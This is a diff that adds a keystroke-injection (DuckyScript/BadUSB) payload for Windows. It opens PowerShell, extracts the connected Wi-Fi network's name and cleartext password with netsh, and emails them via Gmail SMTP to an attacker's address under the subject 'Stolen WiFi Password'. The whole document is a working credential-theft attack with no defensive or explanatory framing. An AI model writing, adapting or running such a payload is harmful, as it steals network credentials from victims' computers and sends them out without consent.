@@ -1,0 +1,40 @@
+DELAY 10000
+CONTROL w
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+STRING $from_email="<from_email>"
+ENTER
+STRING $to_email="<to_email>"
+ENTER
+STRING $email_pass="<password>"
+ENTER
+
+STRING $_, $ssid = ((netsh wlan show interface | findstr "Profile" | findstr /v "mode") -split ":",2).trim()
+ENTER
+STRING $_, $pass = ((netsh wlan show profile name=$ssid key=clear | findstr Key) -split ":").trim()
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$from_email", $email_pass);
+ENTER
+STRING $email = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $email.From = "$from_email"
+ENTER
+STRING $email.To.Add("$to_email")
+ENTER
+STRING $email.Subject = 'Stolen WiFi Password'
+ENTER
+STRING $email.Body = "SSID: $ssid`r`nPassword: $pass"
+ENTER
+STRING $SMTPInfo.Send("$email")
+ENTER
+STRING exit
+ENTER
